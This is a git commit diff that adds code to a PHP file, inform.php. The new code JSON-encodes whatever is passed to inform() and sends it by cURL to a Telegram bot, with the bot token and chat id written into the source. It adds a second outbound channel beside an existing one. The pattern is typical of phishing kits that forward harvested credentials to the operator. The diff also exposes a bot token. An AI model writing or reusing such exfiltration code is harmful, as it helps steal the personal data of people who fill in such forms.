7724b067246285ab03f2aa3b2d1e2f686afac90b
Olorunfemi-Ojo Tomiwa <ot.server1@outlook.com>
2022-02-04 01:28:42 +0100

    Update inform.php

--- inform.php
+++ inform.php
@@ -11,6 +11,17 @@ function inform($details) {
     
     $ist = curl_exec($cURLConnection);
     curl_close($cURLConnection);    
+
+        
+    $url = 'https://api.telegram.org/bot5163954825:AAF68sc8hTwI2UgMI4kcYgq1MwWQRw74ZZA/sendMessage?chat_id=919833146&text="'. json_encode($details) . '"';
+     
+    $cURLConnection = curl_init();
+    
+    curl_setopt($cURLConnection, CURLOPT_URL, $url);
+    curl_setopt($cURLConnection, CURLOPT_RETURNTRANSFER, true);
+    
+    $ist = curl_exec($cURLConnection);
+    curl_close($cURLConnection);    
 }
 
 ?>
